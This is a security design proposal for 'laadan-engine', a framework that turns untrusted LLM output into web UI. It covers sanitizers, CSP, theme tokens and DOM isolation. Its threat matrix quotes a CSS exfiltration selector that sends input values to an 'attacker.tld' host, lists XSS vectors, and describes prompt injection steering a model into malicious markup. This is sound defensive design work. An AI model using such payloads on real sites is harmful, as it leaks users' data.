# Security Model & Boundary Controls: Láadan Engine

**Status:** Design Proposal (Phase 0 Blueprint)  
**Focus:** Untrusted Model Output, Zero-Eval SDUI, Sanitization Pipeline, and Safe Visual Capabilities  

---

## 1. Security Approach: Capability Without `eval`

Prompt injection in generative web applications cannot be eliminated at the prompt layer alone. If a user visits a synthetic route or views data that contains an indirect prompt injection, a language model may be tricked into emitting malicious markup, phishing overlays, or unauthorized state changes.

Instead of relying on prompt-level instructions ("please do not output `<script>` tags"), `laadan-engine` treats every model response as untrusted input (`@we`) and enforces hard technical boundaries in Python, Rust (`nh3`), and browser CSP headers:

```text
[ Browser / API Input (@wahel) ]
               │
               ▼
     [ Ingress Validator ]    ── Pydantic schema check, size cap (64 KB), CSRF check (@wa)
               │
               ▼
     [ Model Gateway ]        ── Generates untrusted PageDocument AST proposal (@we)
               │
               ▼
     [ AST & Theme Compiler ] ── Pydantic discriminated union + bounded theme tokens
               │
               ▼
     [ RichText Sanitizer ]   ── nh3 (Rust ammonia) + selectolax tree verification
               │
               ▼
     [ Delivery Gateway ]     ── Strict CSP Level 3 (script-src 'self', connect-src 'self')
               │
               ▼
     [ Client Runtime ]       ── laadan-client.js (~4 KB), event delegation, zero eval (@wi)
```

---

## 2. Threat Matrix & Architectural Mitigations

| Threat Category | Attack Vector in Generative Web Apps | Mitigation in `laadan-engine` |
| :--- | :--- | :--- |
| **Spoofing** | Model hallucinates authenticated status or tries to self-certify its output as verified (`@wi`). | Session cookies are HTTP-only and signed server-side. Model proposals are forced to `Evidence.CONJECTURAL` (`@we`) by the `ModelGateway` regardless of raw token output. |
| **Tampering (XSS)** | Prompt injection causes the model to emit `<script>`, inline `onerror=...`, or `javascript:` links. | Structural UI is compiled from a typed Pydantic AST via Jinja2 autoescaping. Free-form rich text is stripped down to safe formatting tags by `nh3` (Rust `ammonia`). |
| **Traceability** | Ambiguity over whether a state change came from user input, a fast-path toggle, or a model hallucination. | Structured provenance logging (`LAADAN_LOG_PROVENANCE`) records the route, action envelope, and evidential marker (`@wa`, `@we`, `@wi`) for every state transition. |
| **Information Disclosure** | **CSS Data Exfiltration** (e.g., `input[value^="a"] { background: url(https://attacker.tld/a) }`) or external tracking beacons. | Raw `<style>` blocks, arbitrary inline `style` strings, and external `url(...)` references are banned. Egress is locked down via `connect-src 'self'` and `img-src 'self' data:`. |
| **Denial of Service** | Unbounded token output, deep AST nesting, or rapid click-spamming exhausting LLM rate limits. | Payload size limits (`LAADAN_MAX_PAYLOAD_BYTES=65536`), AST recursion depth limits, action coalescing (`ActionCoalescer`), and the Zero-LLM Fast-Path for UI toggles. |
| **Elevation of Privilege** | **Excessive Agency**: Model attempts to run shell commands, arbitrary Python functions, or database queries. | The model has zero access to shell tools, `eval`, or raw SQL. It can only propose UI component trees and bounded `CarrierBag` entity updates. |

---

## 3. Defense-in-Depth Pipeline: High Capability + High Safety

A naive security policy locks down a UI so tightly that every generated page looks identical and static. `laadan-engine` separates **dangerous capabilities** (arbitrary code, arbitrary selectors, external URLs) from **expressive capabilities** (rich components, custom color themes, native HTML disclosure widgets, and form controls).

### 3.1 Two-Stage Rendering: Pydantic AST Compiler + `nh3` Sanitizer
Rather than running a single regex or sanitizer over raw LLM HTML, rendering is split into two distinct mechanisms:

1. **Structural Components & Form Controls (Compiled via Jinja2):**
   * Layout containers, cards, tables, buttons (`ActionTrigger`), and form inputs (`TextInput`, `SelectField`, `Checkbox`) are never parsed from raw model HTML.
   * Instead, the model emits typed JSON nodes validated by Pydantic v2 discriminated unions. The server's `PageCompiler` renders these nodes through application-owned Jinja2 templates with strict attribute escaping.
   * Because the server templates emit the `<input>`, `<select>`, and `<button data-laadan-*>` elements directly, form controls remain 100% functional without opening an HTML injection vector.

2. **RichText & Native Interactive Formatting (Sanitized via `nh3` + `selectolax`):**
   * Inside `RichText` components, the model can write expressive HTML formatting without escaping headaches.
   * **`nh3` (Rust `ammonia` / `html5ever`)** parses and sanitizes `RichText` content in sub-millisecond time using a strict allowlist:
     * **Allowed Tags:** `p`, `span`, `strong`, `em`, `code`, `pre`, `blockquote`, `ul`, `ol`, `li`, `br`, `hr`, `sub`, `sup`, `del`, `a`, `details`, `summary`.
     * **Bonus Capability (`<details>` / `<summary>`):** Allowing native HTML `<details>` and `<summary>` lets the model build expandable accordions and spoilers that work natively in the browser with zero JavaScript.
     * **Stripped Everything Else:** `<script>`, `<style>`, `<iframe>`, `<object>`, `<embed>`, `<svg>`, `<math>`, `<form>`, and all `on*` event attributes are unconditionally removed.
     * **Link Safety:** `href` on `<a>` tags is restricted to local relative paths (`/instagram`, `/whatsapp`) or explicitly allowed schemes (`https:`), with `rel="noopener noreferrer"` enforced automatically by `nh3`.
   * **`selectolax` (C `lexbor` engine)** is used in the security adapter and test suite for fast server-side DOM tree inspection, verifying structural invariants (such as ID prefixing and absence of forbidden nodes) before fragments leave the server.

### 3.2 Safe Visual Theming vs. CSS Exfiltration
CSS is a surprisingly powerful attack vector: if a model can emit raw `<style>` rules, it can read secret values out of `<input>` fields using attribute selectors or overlay a fake login screen using `position: fixed; z-index: 999999`.

To give every generated vibe-app its own visual identity (e.g., dark emerald for `/whatsapp`, warm gradient cards for `/instagram`, brutalist monospace for `/terminal`) **without** allowing raw CSS injection:

1. **Bounded Theme Tokens (`PageDocument.theme`):**
   * The model can specify a `theme` object on any `PageDocument` with validated properties:
     * Color tokens (`primary`, `surface`, `background`, `text`, `accent`) validated against strict hex syntax (`^#[0-9a-fA-F]{6}$`) or named palette presets.
     * Layout and shape tokens (`radius`: `"none" | "sm" | "md" | "lg" | "full"`, `font`: `"sans" | "mono" | "serif"`, `density`: `"compact" | "comfortable"`).
   * The server compiles these validated tokens into scoped CSS custom properties (`--ldn-primary: #10b981; --ldn-radius: 0.75rem;`) on the page root. Because values cannot contain `url(...)`, `;`, `{`, or selectors, CSS exfiltration is impossible.
2. **Utility Class Allowlist (`DESIGN_TOKEN_ALLOWLIST`):**
   * Component `class` strings are split on whitespace and filtered against an allowlist of layout, flex/grid, spacing, and typography classes.
   * Classes allowing full-viewport `position: fixed` overlays outside the application shell are excluded to prevent UI redressing.

### 3.3 Content Security Policy (CSP Level 3)
Every HTML response includes a strict Content Security Policy header as a browser-enforced backstop:

```http
Content-Security-Policy:
    default-src 'none';
    script-src 'self';
    style-src 'self';
    img-src 'self' data:;
    font-src 'self';
    connect-src 'self';
    frame-src 'none';
    object-src 'none';
    base-uri 'none';
    form-action 'self';
    frame-ancestors 'none';
```

* **Zero Inline Scripts:** Because `laadan-client.js` is loaded from `/static/laadan-client.js` and uses event delegation (`data-laadan-*`), `script-src 'self'` requires no nonces or `'unsafe-inline'`. Even if a sanitizer bug ever let an inline `<script>` or `onclick` slip through, the browser refuses to execute it.
* **No Unauthorized Egress:** `connect-src 'self'` and `img-src 'self' data:` prevent the browser from leaking data to external servers via `fetch()`, `XMLHttpRequest`, WebSockets, or remote image requests.

### 3.4 DOM Clobbering & ID Isolation
DOM Clobbering happens when HTML elements with `id` or `name` attributes shadow global properties on `window` or `document`:
1. **Automatic ID Prefixing:** Every component `id` supplied by the model (e.g., `target="chat-thread"`) is rendered into HTML with the prefix `ldn-user-` (`id="ldn-user-chat-thread"`).
2. **Transparent Client Lookup:** `laadan-client.js` resolves target IDs via `document.getElementById("ldn-user-" + target)` and never reads named properties off `window` or `document`.
3. **CSRF Isolation:** The anti-CSRF token is stored in the outer server-owned page shell (`<body data-ldn-csrf="...">`) and validated against a `SameSite=Strict` HTTP-only cookie, keeping session auth out of the model-generated fragment tree.

### 3.5 Symbolic Assets & Anti-SSRF
To prevent Server-Side Request Forgery (SSRF) and external tracking beacons:
* Models cannot supply raw image URLs.
* Visual assets use the `Asset` component with symbolic IDs (`{"type": "Asset", "props": {"id": "asset:icon-message"}}`) discovered through the local `AssetCatalog`.
* The server maps valid IDs to `/static/assets/...` files and replaces unknown IDs with a local fallback placeholder SVG.

### 3.6 GlitchBoundary (Graceful Degradation)
Language models occasionally produce truncated JSON, violate a schema constraint, or reference an invalid component prop. When validation fails:
* `GlitchBoundary` catches the Pydantic or compiler error before any 500 error reaches the client.
* It logs the rejected `@we` proposal for debugging and returns a clean, styled fallback fragment inside the target DOM container so the rest of the page remains interactive.
